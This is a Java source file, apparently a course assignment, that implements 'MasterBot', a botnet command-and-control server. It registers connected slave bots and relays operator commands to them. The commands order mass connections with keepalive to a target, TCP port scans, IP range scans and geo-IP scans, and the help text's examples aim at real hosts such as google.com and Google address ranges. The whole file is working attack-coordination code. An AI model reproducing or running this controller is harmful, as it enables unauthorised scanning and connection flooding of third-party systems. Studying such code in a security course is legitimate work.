/**
 * Created by yluo0203 on 4/28/2017.
 */
//Refference: http://pirate.shu.edu/~wachsmut/Teaching/CSAS2214/Virtual/Lectures/chat-client-server.html
/**
 * Program: MasterBot
 * Author: Tse-Jen LU
 */

import java.io.*;
import java.net.*;
import java.util.Arrays;
import java.util.Scanner;
import java.util.Calendar;
import java.text.DateFormat;
import java.text.SimpleDateFormat;

public class MasterBot implements Runnable
{
    private int clientCount = 0;
    private Scanner scan = null;
    private String console = "";
    private Thread thread = null;
    private ServerSocket server = null;
    private String[] dates = new String[50];
    private String[] commands = new String[6];
    private SimpleDateFormat dateFormat = null;
    private MasterBotThread clients[] = new MasterBotThread[50];

    public MasterBot(int port)
    {
        try
        {
            System.out.println("Starting server at port: " + port + ", Waiting for Slave.");
            server = new ServerSocket(port);
            System.out.println("Server started: " + server);
            start();
            Arrays.fill(dates, "");
            KeyCommander keyCommand = new KeyCommander();
            keyCommand.start();
        }
        catch(IOException ioe)
        {  System.out.println("Can not bind to port " + port + ": " + ioe.getMessage()); }
    }

    public void run()
    {
        while (thread != null)
        {
            try{
                addThread(server.accept()); //goto line 59
            }
            catch(IOException ioe){
                System.out.println("Server accept error: " + ioe);
                stop();
            }
        }
    }

    public void addThread(Socket socket)
    {
        clients[clientCount] = new MasterBotThread(this, socket);
        try
        {
            clients[clientCount].open();
            clients[clientCount].start();
            dates[clientCount] += getDate();
            System.out.println("Slave added");
            System.out.print("> ");
            clientCount++;
        }
        catch(IOException ioe) {
            //System.out.println("Error opening thread: " + ioe);
        }
    }

    public void start()
    {
        if (thread == null)
        {
            thread = new Thread(this);
            thread.start();
        }
    }
    public void stop()
    {
        if (thread != null)
        {
            thread.stop();
            thread = null;
        }
    }

    //Slave Send Back
    public synchronized void handle(int ID, String input)
    {
        if (input.equals(".bye"))
        {
            clients[findClient(ID)].send(".bye");
            remove(ID);
        }
        if((input.contains("one."))){
            System.out.println(input);
            System.out.print("> ");
        }else if(input.contains("connect")  || input.contains("Country")){
            System.out.println(input);
            System.out.print("> ");
        }else
//            System.out.println("SlaveBot " + ID + " responded " + input);
            System.out.print(input + " , ");
//            System.out.print("> ");
    }


    private int findClient(int ID)
    {
        for (int i = 0; i < clientCount; i++)
            if (clients[i].getID() == ID)
                return i;
        return -1;
    }

    public synchronized void remove(int ID)
    {
        int pos = findClient(ID);
        if (pos >= 0)
        {
            MasterBotThread toTerminate = clients[pos];
            System.out.println("Removing slave thread " + ID + " at " + pos);
            if (pos < clientCount-1)
                for (int i = pos+1; i < clientCount; i++)
                    clients[i-1] = clients[i];
            clientCount--;
            try
            {  toTerminate.close(); }
            catch(IOException ioe)
            {  System.out.println("Error closing thread: " + ioe); }
            toTerminate.stop();
        }
    }
    //---------------------------------------------------------------------------
    private class KeyCommander extends Thread
    {
        public void run(){
            while(true)
            {
                System.out.print("> ");
                scan = new Scanner(System.in);
                console = scan.nextLine();
                commands = console.split(" ");
                SendToSlave();
            }
        }
    }
    //----------------------------------------------------------------------------
    private void CommendOne(String CmdOne) {
//        System.out.println(CmdOne);
        if (CmdOne.equals("all")) {
//            System.out.println("all");
            for (int i = 0; i < clientCount; i++) { //對於所有clients
                clients[i].send(console);
            }
        } else {
//            System.out.println("else");
            for (int i = 0; i < clientCount; i++) {
                if (clients[i].getSocket().getInetAddress().toString().contains(commands[1]))
                    clients[i].send(console);
            }
        }
    }
    //----------------------------------------------------------------------------
    private void SendToSlave()
    {
        switch(commands[0])
        {
            case "list":
                if(clientCount != 0) {
                    for (int i = 0; i < clientCount; i++) {
                        System.out.println(clients[i].getSocket().getInetAddress() + " || " +
                                clients[i].getSocket().getPort() + " || " + dates[i]);
                    }
                }else {
                    System.out.println("There is No Slave Connected.");
                }
                break;

            case "connect":
                CommendOne(commands[1]);
                break;

            case "disconnect":
                if(commands.length > 3) {
                    if ((commands[3]) == "" || (commands[3] == "all")) {
                        console = console + "all";
                    }
                }
                CommendOne(commands[1]);
                break;

            //MasterBot > tcpportscan all www.google.com 6000-7000
            case "tcpportscan":
                CommendOne(commands[1]);
                break;

            //MasterBot > ipscan all 66.249.84.20-66.249.84.30
            case "ipscan":
                CommendOne(commands[1]);
                break;
            //MasterBot > geoipscan all 66.249.84.20-66.249.84.30
            case "geoipscan":
                CommendOne(commands[1]);
                break;

            default:
                System.out.println("Command Incorrect.");
                System.out.println("Please try  \"list\" \"connect\" \"disconnect\" \"tcpportscan\" \"ipscan\" \"geoipscan\".");
                System.out.println(" ");
                System.out.println("Example instruction: ");
                System.out.println("list: ");
                System.out.println(" ");
                System.out.println("tcpportscan / keepalive / url=/#q=: ");
                System.out.println("connect all www.google.com 80");
                System.out.println("connect all www.google.com 80 1 keepalive");
                System.out.println("connect all www.google.com 80 1 url=/#q=");
                System.out.println(" ");
                System.out.println("connect: ");
                System.out.println("ipscan all 66.249.84.20-66.249.84.30");
                System.out.println(" ");
                System.out.println("tcpportscan: ");
                System.out.println("tcpportscan all 216.58.194.174 79-81");
                System.out.println("tcpportscan all www.google.com 79-81");
                System.out.println(" ");
                System.out.println("geoipscan: ");
                System.out.println("geoipscan all 66.249.84.20-66.249.84.30");
                System.out.println("geoipscan all 66.249.84.20-66.249.84.30");
                System.out.println("or restart SlaveBot.");
                break;

        }

    }
    public static String getDate()
    {
        DateFormat dateFormat = new SimpleDateFormat("YYYY/MM/DD");
        Calendar Date = Calendar.getInstance();
        String getDate = dateFormat.format(Date.getTime());
        return getDate;
    }

    public static void main(String args[])
    {
        MasterBot server = null;
        if (args.length != 2)
        {
            System.out.println("Command Incorrect. ");
            System.out.println("Command Format is: java MasterBot -p [PortNumber]");
        }
        else
            server = new MasterBot(Integer.parseInt(args[1]));
    }
}
